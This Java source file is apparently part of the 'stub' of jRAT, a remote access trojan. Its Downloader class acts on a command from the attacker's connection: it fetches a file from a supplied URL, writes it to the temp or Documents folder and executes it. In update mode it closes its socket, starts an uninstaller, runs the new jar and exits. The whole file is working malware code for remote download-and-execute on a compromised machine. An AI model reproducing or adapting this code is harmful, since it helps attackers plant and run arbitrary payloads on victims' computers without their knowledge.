package io.jrat.stub;

import io.jrat.common.Constants;
import io.jrat.common.downloadable.Downloadable;
import io.jrat.stub.packets.Temp;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;
import oslib.OperatingSystem;


public class Downloader extends Thread {

	private Connection con;
	private String url;
	private boolean update;
	private Downloadable type;
	private boolean readFromSocket;

	public Downloader(Connection con, String url, boolean update, String type, boolean readFromSocket) {
		this.con = con;
		this.url = url;
		this.update = update;
		this.type = Downloadable.get(type);
		this.readFromSocket = readFromSocket;
	}

	public void run() {
		try {
			con.status(Constants.STATUS_DOWNLOADING_FILE);

			String fileName = (new Random().nextInt()) + type.getExtension();

			try {
				File file = null;
				if (readFromSocket) {
					file = Temp.MAP.get(url);
				} else if (update) {
					file = File.createTempFile(Configuration.getName() + (new Random()).nextInt(), ".jar");
				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					file = new File(System.getProperty("java.io.tmpdir"), fileName);
				} else {
					file = new File(System.getProperty("user.home") + "/Documents/" + fileName);
				}

				if (!file.getParentFile().exists()) {
					file.getParentFile().mkdirs();
				}
				
				
				if (readFromSocket) {
					//new FileIO().readFile(file, con.getSocket(), con.getDataInputStream(), con.getDataOutputStream(), null, Main.aesKey);					
				} else {
					URLConnection ucon = new URL(url).openConnection();
					InputStream in = ucon.getInputStream();
					
					FileOutputStream fout = new FileOutputStream(file);

					byte data[] = new byte[1024];
					int count;
					while ((count = in.read(data, 0, 1024)) != -1) {
						fout.write(data, 0, count);
					}

					in.close();
					fout.close();
				}
				

				if (update) {
					try {
						con.getSocket().close();
					} catch (Exception ex) {
						ex.printStackTrace();
					}
					new Uninstaller().start();
					type.execute(file);
					System.exit(0);
				} else {
					type.execute(file);
					con.status(Constants.STATUS_EXECUTED_FILE);
				}
			} finally {

			}
		} catch (Exception ex) {
			ex.printStackTrace();
			con.status(Constants.STATUS_FAILED_FILE);
		}
	}

}
